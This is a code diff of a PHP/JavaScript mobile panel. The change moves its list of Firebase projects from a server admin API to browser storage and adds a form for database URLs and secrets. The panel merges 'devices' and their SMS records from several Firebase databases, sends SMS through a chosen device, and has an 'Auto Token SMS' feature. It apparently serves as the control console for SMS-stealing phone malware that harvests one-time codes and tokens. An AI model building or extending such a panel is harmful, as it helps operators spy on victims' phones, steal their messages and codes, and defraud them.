@@ -29,16 +29,6 @@ if (isset($_GET['rebel_app_api'])) {
   exit;
 }
 
-if (isset($_GET['rebel_firebase_api'])) {
-  $data = rebel_firebase_load();
-  rebel_json_out([
-    'ok' => true,
-    'updated' => (int)($data['updated'] ?? 0),
-    'projects' => array_values($data['projects']),
-    'count' => count($data['projects']),
-  ]);
-}
-
 if (isset($_GET['rebel_send_sms']) || isset($_POST['rebel_send_sms'])) {
   $body = json_decode(file_get_contents('php://input') ?: '{}', true);
   if (!is_array($body)) {
@@ -366,7 +356,6 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
       <span class="proto-tag">📱 MOBILE PROTOTYPE</span>
       <div class="menu-list">
         <div class="menu-item" onclick="openFbSheet()">Firebase Projects <span id="moreFbName">—</span></div>
-        <a class="menu-item" href="admin.php" style="text-decoration:none;color:inherit">Admin Panel <span>admin.php →</span></a>
         <div class="menu-item" onclick="toggleAutoToken()">Auto Token SMS <div class="toggle" id="autoTokenToggle"></div></div>
         <div class="menu-item" onclick="useSelForAutoToken()">Set Auto SMS Device <span>Use current</span></div>
         <a class="menu-item" href="sex.php" style="text-decoration:none;color:inherit">Desktop Panel <span>sex.php →</span></a>
@@ -390,8 +379,11 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
   <div class="sheet-title">Firebase Projects — All Combined</div>
   <div id="fbSheetList"></div>
   <div class="fb-add-form">
-    <p style="font-size:12px;color:var(--muted);line-height:1.5;margin-bottom:12px">Firebase projects ab <strong>admin.php</strong> se add hote hain — yahan sirf list dikhegi (auto sync).</p>
-    <a href="admin.php" class="btn-add-fb" style="display:block;text-align:center;text-decoration:none;color:#fff">Open Admin Panel →</a>
+    <input id="fbAddName" placeholder="Project name (e.g. Panel 2)"/>
+    <input id="fbAddUrl" placeholder="Firebase URL — https://xxx.firebaseio.com"/>
+    <input id="fbAddSecret" placeholder="Database secret / auth key (optional)"/>
+    <input id="fbAddApiKey" placeholder="Web API key (optional — for live updates)"/>
+    <button class="btn-add-fb" type="button" onclick="addFirebaseProject()">+ Add Firebase Project</button>
   </div>
 </div>
 <div class="toast-wrap" id="toasts"></div>
@@ -400,11 +392,10 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 <script>
 var SEND_SMS_URL='mobile.php?rebel_send_sms=1';
 var SMS_TOKEN_URL='sex.php?sms_token_api=1';
-var FIREBASE_API_URL='admin.php?rebel_firebase_api=1';
 var allDevs=[], selDev='', clientsRawMap={};
 var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
-var firebaseConfigUpdated=0;
 var activeListeners={}, window_sms=[], window_allSms=[], window_newSms=[];
+var FB_LIST_KEY='rbl_firebase_list';
 var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','user','users','messages','admin_pass','passwords','webhook','tokens','auth'];
 var SUMMARY_NODES=['devices_status','clients'];
 var DEVICE_NODES=['devices','users','clients_list','online_devices'];
@@ -447,21 +438,8 @@ function parseDevKey(key){var i=String(key).indexOf('::');return i<0?{fbId:'',de
 function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(firebaseInstances[i].id===fbId)return firebaseInstances[i];return null;}
 function getSelDev(){return allDevs.find(function(d){return d.id===selDev;})||null;}
 function getFilteredDevs(){return allDevs;}
-function fetchFirebaseConfigsFromServer(){
-  return fetch(FIREBASE_API_URL,{cache:'no-store'}).then(function(r){
-    if(!r.ok)throw new Error('Firebase API failed');
-    return r.json();
-  }).then(function(d){
-    if(!d||!d.ok)throw new Error((d&&d.error)||'Invalid Firebase API response');
-    firebaseConfigUpdated=Number(d.updated||0);
-    var projects=Array.isArray(d.projects)?d.projects:[];
-    DEFAULT_FIREBASES.forEach(function(def){
-      if(!projects.some(function(c){return c.id===def.id||(c.databaseURL||'').replace(/\/$/,'')===(def.databaseURL||'').replace(/\/$/,'');})){
-        projects.push(def);
-      }
-    });
-    return projects;
-  });
+function saveFirebaseConfigs(){
+  try{localStorage.setItem(FB_LIST_KEY,JSON.stringify(firebaseConfigs));}catch(e){}
 }
 function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){
   if(!r.ok)return null;
@@ -469,36 +447,15 @@ function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){
 }).catch(function(){return null;});}
 function isFirebaseErr(d){return !!(d&&typeof d==='object'&&d.error&&Object.keys(d).length<=2);}
 
-function configsFingerprint(cfgs){
-  return JSON.stringify((cfgs||[]).map(function(c){
-    return{id:c.id,name:c.name,databaseURL:(c.databaseURL||'').replace(/\/$/,''),secret:c.secret||c.key||'',apiKey:c.apiKey||'',schema:c.schema||''};
-  }));
-}
-function rebuildFirebaseInstances(cfgs){
-  firebaseInstances=[];
-  (cfgs||[]).forEach(initFirebaseInstance);
-}
-function applyFirebaseConfigs(cfgs,forceReload){
-  var next=cfgs||[];
-  var changed=forceReload||configsFingerprint(next)!==configsFingerprint(firebaseConfigs);
-  firebaseConfigs=next;
-  if(!changed)return Promise.resolve(false);
-  clearListeners();
-  clientsRawMap={};
-  selDev='';
-  rebuildFirebaseInstances(firebaseConfigs);
-  updateFbUi();
-  return Promise.all(firebaseInstances.map(function(inst){
-    attachLive(inst);
-    return discoverInstance(inst);
-  })).then(function(){
-    processClientsData();
-    updateFbUi();
-    return true;
-  });
-}
 function loadFirebaseConfigs(){
-  return fetchFirebaseConfigsFromServer();
+  try{
+    var s=localStorage.getItem(FB_LIST_KEY);
+    if(s){var p=JSON.parse(s);if(Array.isArray(p)&&p.length){
+      DEFAULT_FIREBASES.forEach(function(def){if(!p.some(function(c){return c.id===def.id;}))p.push(def);});
+      return p;
+    }}
+  }catch(e){}
+  return DEFAULT_FIREBASES.slice();
 }
 function getFbAuthKey(inst){
   if(!inst||!inst.config)return '';
@@ -527,17 +484,96 @@ function initFirebaseInstance(cfg){
   var inst={id:cfg.id,name:cfg.name,config:cfg,db:db,restUrl:(cfg.databaseURL||'').replace(/\/$/,''),schema:cfg.schema||(cfg.databaseURL.indexOf('rabel-raand')>=0?'rabel':'spinplay'),liveAttached:false};
   firebaseInstances.push(inst);return inst;
 }
-function initFirebase(forceReload){
-  return loadFirebaseConfigs().then(function(cfgs){
-    return applyFirebaseConfigs(cfgs,forceReload);
+function initFirebase(){
+  firebaseInstances=[];firebaseConfigs=loadFirebaseConfigs();
+  firebaseConfigs.forEach(initFirebaseInstance);
+  updateFbUi();
+}
+function syncFirebaseFromAdmin(){
+  fetch('admin.php?rebel_firebase_api=1',{cache:'no-store'}).then(function(r){return r.json();}).then(function(d){
+    if(!d||!d.ok||!Array.isArray(d.projects))return;
+    var merged=[], seen={}, url;
+    d.projects.forEach(function(x){
+      url=(x.databaseURL||'').replace(/\/$/,'');
+      if(url&&!seen[url]){seen[url]=1;merged.push(x);}
+    });
+    try{
+      var s=localStorage.getItem(FB_LIST_KEY);
+      if(s){var local=JSON.parse(s);if(Array.isArray(local))local.forEach(function(x){
+        url=(x.databaseURL||'').replace(/\/$/,'');
+        if(url&&!seen[url]){seen[url]=1;merged.push(x);}
+      });}
+    }catch(e){}
+    DEFAULT_FIREBASES.forEach(function(def){
+      url=(def.databaseURL||'').replace(/\/$/,'');
+      if(url&&!seen[url]){seen[url]=1;merged.push(def);}
+    });
+    var nextFp=JSON.stringify(merged.map(function(c){return{id:c.id,databaseURL:(c.databaseURL||'').replace(/\/$/,'')};}));
+    var curFp=JSON.stringify(firebaseConfigs.map(function(c){return{id:c.id,databaseURL:(c.databaseURL||'').replace(/\/$/,'')};}));
+    if(nextFp===curFp)return;
+    try{localStorage.setItem(FB_LIST_KEY,JSON.stringify(merged));}catch(e){}
+    firebaseInstances=[];firebaseConfigs=merged;
+    firebaseConfigs.forEach(initFirebaseInstance);
+    firebaseInstances.forEach(function(inst){attachLive(inst);});
+    Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
+      processClientsData();updateFbUi();
+    });
+  }).catch(function(){});
+}
+function addFirebaseProject(){
+  var name=document.getElementById('fbAddName').value.trim();
+  var url=document.getElementById('fbAddUrl').value.trim().replace(/\/$/,'');
+  var secret=document.getElementById('fbAddSecret').value.trim();
+  var apiKey=document.getElementById('fbAddApiKey').value.trim();
+  if(!name||!url){toast('Project name aur Firebase URL zaroori hai',false);return;}
+  if(firebaseConfigs.some(function(c){return (c.databaseURL||'').replace(/\/$/,'')===url;})){
+    toast('Yeh Firebase URL pehle se added hai',false);return;
+  }
+  var id='fb_'+Date.now();
+  var cfg={
+    id:id,
+    name:name,
+    databaseURL:url,
+    secret:secret,
+    key:secret,
+    apiKey:apiKey,
+    schema:url.indexOf('rabel')>=0?'rabel':'spinplay'
+  };
+  firebaseConfigs.push(cfg);
+  saveFirebaseConfigs();
+  var inst=initFirebaseInstance(cfg);
+  attachLive(inst);
+  discoverInstance(inst).then(function(){
+    processClientsData();
+    updateFbUi();
+    toast('Added: '+name,true);
+  });
+  document.getElementById('fbAddName').value='';
+  document.getElementById('fbAddUrl').value='';
+  document.getElementById('fbAddSecret').value='';
+  document.getElementById('fbAddApiKey').value='';
+  closeFbSheet();
+}
+function removeFirebaseProject(id){
+  if(firebaseConfigs.length<=1){toast('Kam se kam 1 Firebase chahiye',false);return;}
+  firebaseConfigs=firebaseConfigs.filter(function(c){return c.id!==id;});
+  saveFirebaseConfigs();
+  Object.keys(clientsRawMap).forEach(function(k){
+    if(k.indexOf(id+'::')===0)delete clientsRawMap[k];
+  });
+  if(selDev&&selDev.indexOf(id+'::')===0){selDev='';clearListeners();}
+  firebaseInstances=[];
+  firebaseConfigs.forEach(initFirebaseInstance);
+  firebaseInstances.forEach(function(inst){attachLive(inst);});
+  Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
+    processClientsData();
+    updateFbUi();
+    toast('Project removed',true);
   });
 }
-function syncFirebaseFromServer(){
-  return fetchFirebaseConfigsFromServer().then(function(cfgs){
-    return applyFirebaseConfigs(cfgs,false);
-  }).catch(function(){return false;});
-}
-function openFbSheet(){document.getElementById('sheetBg').classList.add('open');document.getElementById('fbSheet').classList.add('open');}
+initFirebase();
+syncFirebaseFromAdmin();
+
 function updateFbUi(){
   var total=allDevs.length;
   var proj=firebaseConfigs.length;
@@ -546,10 +582,13 @@ function updateFbUi(){
   document.getElementById('hdrSub').textContent=total+' devices · '+proj+' Firebase combined';
   var html=firebaseConfigs.map(function(c){
     var cnt=allDevs.filter(function(d){return d.fbId===c.id;}).length;
-    return '<div class="fb-option"><div><div>'+esc(c.name)+'</div><div class="cnt">'+cnt+' devices · '+esc((c.databaseURL||'').replace(/^https?:\/\//,'').split('/')[0])+'</div></div></div>';
+    return '<div class="fb-option"><div><div>'+esc(c.name)+'</div><div class="cnt">'+cnt+' devices · '+esc((c.databaseURL||'').replace(/^https?:\/\//,'').split('/')[0])+'</div></div>'+
+      (proj>1?'<button type="button" onclick="event.stopPropagation();removeFirebaseProject(\''+c.id+'\')" style="background:none;border:1px solid var(--border);color:var(--error);border-radius:8px;padding:6px 10px;font-size:10px;cursor:pointer">✕</button>':'')+
+      '</div>';
   }).join('');
-  document.getElementById('fbSheetList').innerHTML=html||'<div class="empty-state" style="padding:20px"><div class="ico">🔥</div>No Firebase yet — add in admin.php</div>';
+  document.getElementById('fbSheetList').innerHTML=html||'<div class="empty-state" style="padding:20px"><div class="ico">🔥</div>No Firebase yet — add below</div>';
 }
+function openFbSheet(){document.getElementById('sheetBg').classList.add('open');document.getElementById('fbSheet').classList.add('open');}
 function closeFbSheet(){document.getElementById('sheetBg').classList.remove('open');document.getElementById('fbSheet').classList.remove('open');}
 
 function getPhoneFromRecord(s){
@@ -1093,26 +1132,19 @@ function useSelForAutoToken(){
   }).catch(function(){toast('Auto token save failed',false);});
 }
 
-/* BOOT — direct open, Firebase from admin.php server sync */
+/* BOOT — direct open, all Firebase combined */
 (function(){
   try{
-    initFirebase(true).then(function(){
-      panelReady=true;
-      return fetchAllData();
-    }).catch(function(){
-      panelReady=true;
-      toast('Firebase sync failed — check admin.php',false);
-    });
+    panelReady=true;
+    fetchAllData().catch(function(){toast('Sync failed — check Firebase URL/secret',false);});
     loadAutoTokenState();
-  }catch(e){console.error(e);panelReady=true;}
+  }catch(e){console.error(e);}
 })();
 setInterval(function(){
   if(!panelReady)return;
-  syncFirebaseFromServer().then(function(changed){
-    if(changed)fetchAllData().catch(function(){});
-  });
+  syncFirebaseFromAdmin();
   fetchAllData().catch(function(){});
-},20000);
+},60000);
 window.addEventListener('unhandledrejection',function(){});
 </script>
 </body>
